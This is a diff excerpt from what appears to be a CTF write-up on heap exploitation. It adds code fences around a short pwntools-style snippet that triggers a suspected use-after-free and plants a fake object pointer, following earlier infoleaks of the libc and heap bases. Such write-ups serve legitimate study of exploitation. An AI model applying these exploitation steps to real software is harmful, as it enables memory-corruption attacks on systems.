@@ -15,15 +15,17 @@ With these two powerful infoleak bugs, we can get the libc base as well as the h
 ## Fakeobj???
 We found a bug that wasn't found via analysis. It occurs if we do the following (One of my teammates found it and I still don't know how it was triggered, but we can make some guesses that it is a UAF)
 
-
+```
 cmd("create db") 
+
 cmd("store db int 1 1337")
+
 cmd("getter db 1 2")
 p.sendline("echo {}".format("A"*0x10+p64(fakeobj_addr).strip("\x00")))
 p.sendline("empty")
 
 cmd("print db")
-
+```
 
 I made some speculations about how this happened: 
 1. Each entry (key,value) is stored as a 0x18 sized structure, which contains the pointer to the object. So in code it is like this:
